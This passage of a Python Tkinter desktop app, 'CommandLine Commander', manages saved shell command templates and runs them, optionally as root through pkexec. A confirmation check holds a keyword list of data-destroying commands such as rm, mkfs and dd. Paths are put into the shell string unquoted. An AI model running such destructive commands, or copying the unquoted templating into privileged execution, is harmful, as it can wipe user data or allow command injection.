    def load_commands(self):
        commands = dict(DEFAULT_COMMANDS)
        if COMMAND_FILE.exists():
            try:
                saved = json.loads(COMMAND_FILE.read_text(encoding="utf-8"))
                if isinstance(saved, dict):
                    commands.update(saved)
            except (OSError, json.JSONDecodeError):
                pass
        return commands

    def save_disk(self):
        try:
            COMMAND_FILE.write_text(json.dumps(self.commands, indent=2), encoding="utf-8")
        except OSError as exc:
            messagebox.showerror("Save error", str(exc))

    def populate(self):
        self.combo["values"] = list(self.commands)

    def load_selected(self):
        data = self.commands.get(self.name_var.get(), {})
        if isinstance(data, str):
            data = {"template": data, "needs_admin": False, "description": "Custom command."}
        self.template_var.set(data.get("template", ""))
        self.admin_var.set(bool(data.get("needs_admin", False)))
        self.description_var.set(data.get("description", ""))
        self.update_preview()

    def make_command(self):
        template = self.template_var.get().strip()
        if not template:
            raise ValueError("Enter a command template first.")
        try:
            return template.format(
                source=self.source_var.get().strip(),
                destination=self.destination_var.get().strip(),
                username=self.username,
            )
        except KeyError as exc:
            raise ValueError(f"Unknown placeholder {exc}. Use source, destination, or username.") from exc

    def update_preview(self):
        try: command = self.make_command()
        except ValueError: command = self.template_var.get()
        self.preview_var.set(
            f"pkexec sh -c {shlex.quote(command)}" if self.admin_var.get() and command else command
        )

    def run(self):
        try: command = self.make_command()
        except ValueError as exc:
            messagebox.showerror("Command error", str(exc)); return
        destructive = ("rm ", " -delete", "chmod -R 777", "chown -R", "mkfs", "dd if=")
        if any(x in command for x in destructive):
            if not messagebox.askyesno("Confirm command", f"This command can make significant changes:\n\n{command}\n\nRun it?"):
                return
        self.runner.run(command, Path.home(), self.admin_var.get())

    def save_new(self):
        template = self.template_var.get().strip()
        if not template: return
        name = simpledialog.askstring("Command name", "Name for this command:")
        if not name: return
        desc = simpledialog.askstring("Description", "Short description:") or "Custom saved command."
        self.commands[name.strip()] = {"template": template, "needs_admin": self.admin_var.get(), "description": desc}
        self.save_disk(); self.populate(); self.combo.set(name.strip()); self.description_var.set(desc)

    def update_saved(self):
        name = self.name_var.get()
        if not name: return
        self.commands[name] = {"template": self.template_var.get().strip(), "needs_admin": self.admin_var.get(), "description": self.description_var.get()}
        self.save_disk()
        messagebox.showinfo("Updated", f'"{name}" was updated.')

    def delete(self):
        name = self.name_var.get()
        if name and messagebox.askyesno("Delete", f'Delete "{name}"?'):
            self.commands.pop(name, None); self.save_disk(); self.populate()
            self.name_var.set(""); self.template_var.set(""); self.description_var.set(""); self.preview_var.set("")


class HelpTab(ttk.Frame):
    """Short built-in guide so the application's features are discoverable."""

    HELP = """COMMANDLINE COMMANDER — QUICK GUIDE

COMMAND COMMANDER
• Select a category or type in Search to filter commands.
• Single-click a row to edit its command; double-click to run it.
• Choose the working folder before running commands that use relative paths.
• Recent Command recalls up to 50 commands from the current session.
• Administrator mode uses pkexec and the normal graphical password prompt.

COMMAND CREATOR
• Templates may contain {source}, {destination}, and {username}.
• Select files/folders, inspect Preview, and save reusable commands.
• Saved custom commands are stored in your home folder.

SAFETY
• Read every command and preview before running it.
• Commands that delete files or recursively alter permissions require confirmation.
• Stop requests terminate the command and its child processes.

KEYBOARD SHORTCUTS
• Ctrl+L — focus command search
• Ctrl+Enter — run the selected/edited command
• Ctrl+Shift+C — copy the current command
• F1 — open this Help tab
"""

    def __init__(self, master):
        super().__init__(master, padding=18)
        self.rowconfigure(1, weight=1); self.columnconfigure(0, weight=1)
        ttk.Label(self, text="Help & Safety", style="Title.TLabel").grid(row=0, column=0, sticky="w", pady=(0, 10))
        text = scrolledtext.ScrolledText(self, wrap="word", relief="sunken", borderwidth=3, padx=14, pady=12)
        text.grid(row=1, column=0, sticky="nsew")
        text.insert("1.0", self.HELP); text.configure(state="disabled")


class Main_App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CommandLine Commander")
        self.geometry("1220x820")
        self.minsize(920, 650)
        self.configure(background="#dfe7ef")
        self._configure_styles()
        notebook = ttk.Notebook(self)
        notebook.grid(row=0, column=0, sticky="nsew", padx=8, pady=8)
        self.rowconfigure(0, weight=1); self.columnconfigure(0, weight=1)
        commander = CommanderTab(notebook)
        notebook.add(commander, text="  Command Commander  ")
        notebook.add(CreatorTab(notebook), text="  Command Creator  ")
        notebook.add(HelpTab(notebook), text="  Help & Safety  ")
        self.bind("<Control-l>", lambda _e: self._focus_search(commander))
        self.bind("<Control-Return>", lambda _e: commander.run())
        self.bind("<Control-Shift-C>", lambda _e: commander.copy_command())
        self.bind("<F1>", lambda _e: notebook.select(2))

    @staticmethod
    def _focus_search(commander):
        for child in commander.winfo_children():
            if isinstance(child, ttk.Entry):
                child.focus_set(); return

    def _configure_styles(self):
        style = ttk.Style(self)
        if "clam" in style.theme_names():
            style.theme_use("clam")
        style.configure(".", font=("DejaVu Sans", 10), background="#dfe7ef")
        style.configure("TFrame", background="#dfe7ef")
        style.configure("TLabelframe", background="#dfe7ef", relief="groove", borderwidth=2)
        style.configure("TLabelframe.Label", background="#dfe7ef", foreground="#183153", font=("DejaVu Sans", 10, "bold"))
        style.configure("Title.TLabel", font=("DejaVu Sans", 17, "bold"), foreground="#17324d")
        style.configure("Deep.TEntry", padding=7, relief="sunken", borderwidth=3, fieldbackground="#ffffff")
        style.configure("TButton", padding=(11, 7), font=("DejaVu Sans", 9, "bold"))
        style.configure("Run.TButton", background="#2e7d32", foreground="white")
        style.map("Run.TButton", background=[("active", "#43a047")])
        style.configure("Stop.TButton", background="#b3261e", foreground="white")
        style.map("Stop.TButton", background=[("active", "#d13b32")])
        style.configure("Accent.TButton", background="#1565c0", foreground="white")
        style.map("Accent.TButton", background=[("active", "#1976d2")])
        style.configure("Secondary.TButton", background="#607d8b", foreground="white")
        style.map("Secondary.TButton", background=[("active", "#78909c")])
        style.configure("Treeview", rowheight=27, fieldbackground="#ffffff")
        style.configure("Treeview.Heading", background="#315b7d", foreground="white", font=("DejaVu Sans", 9, "bold"))
        style.configure("TNotebook.Tab", padding=(14, 8), font=("DejaVu Sans", 10, "bold"))


if __name__ == "__main__":
    Main_App().mainloop()
